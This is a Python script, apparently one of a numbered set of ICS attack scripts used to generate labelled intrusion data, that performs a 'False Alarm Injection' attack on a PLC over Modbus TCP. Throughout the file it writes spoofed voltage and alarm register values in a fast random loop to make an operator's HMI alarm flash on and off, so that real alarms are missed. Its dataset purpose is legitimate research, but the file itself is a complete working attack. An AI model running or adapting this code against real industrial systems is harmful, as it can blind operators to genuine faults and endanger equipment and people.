"""
Attack #16: False_Alarm_Injection (False Alarm Injection)
==========================================================
Target register: HR5 (Min Voltage x1000) + HR7 (Alarm)
Technique: Rapidly toggles the voltage reading above and below the alarm
           threshold, continuously triggering and clearing the alarm to
           induce operator alarm fatigue.
Effect: The HMI alarm keeps flashing on and off, and the operator misses
        a genuine alarm amid the noise ("cry wolf" effect).
MITRE ATT&CK for ICS: T0878 - Alarm Suppression
"""

import time
import random
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR5_MIN_VOLTAGE, HR7_ALARM,
    ATTACK_LOOP_DELAY,
    LABEL_FALSE_ALARM
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
# UV alarm threshold: 0.920 pu = 920
# Alarm ON: 910 (below threshold)  -> protection triggers
# Alarm OFF: 970 (normal)          -> protection clears
# This cycle drives the operator up the wall
ALARM_VALUES = [910, 970, 905, 975, 915, 960, 900, 980]

ATTACK_NAME = "False_Alarm_Injection"
ATTACK_ID   = LABEL_FALSE_ALARM


def run_attack(duration_sec=600, label_manager=None):
    """
    False alarm injection.
    Bounces HR5 around the alarm threshold to repeatedly trigger and clear
    the UV alarm, and also randomly toggles the HR7 alarm register.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: HR{HR5_MIN_VOLTAGE} (Volt) + HR{HR7_ALARM} (Alarm)")
    print(f"  Voltage oscillation: {min(ALARM_VALUES)/1000:.3f} <-> {max(ALARM_VALUES)/1000:.3f} pu")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR5 oscillation {min(ALARM_VALUES)}-{max(ALARM_VALUES)}, alarm toggle"
        )

    start_time = time.time()
    packet_count = 0
    alarm_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                # Randomly toggle the voltage between alarm/normal
                fake_volt = random.choice(ALARM_VALUES)
                client.write_register(address=HR5_MIN_VOLTAGE, value=fake_volt)

                # Also toggle the alarm register
                alarm_val = 1 if fake_volt < 920 else 0
                client.write_register(address=HR7_ALARM, value=alarm_val)
                packet_count += 2

                if alarm_val == 1:
                    alarm_count += 1

            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [ALARM] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                status = "ALARM" if fake_volt < 920 else "NORMAL"
                print(f"  [ALARM] {status} #{alarm_count} | "
                      f"V={fake_volt/1000:.3f}pu | "
                      f"remaining: {remaining:.0f}s")

            # Fast toggle (0.5-1.5 seconds)
            time.sleep(random.uniform(0.5, 1.5))

    except KeyboardInterrupt:
        print("\n  [ALARM] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {alarm_count} alarms, {elapsed:.1f}s"
            )
        print(f"\n  [ALARM] Attack finished: {alarm_count} false alarms, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
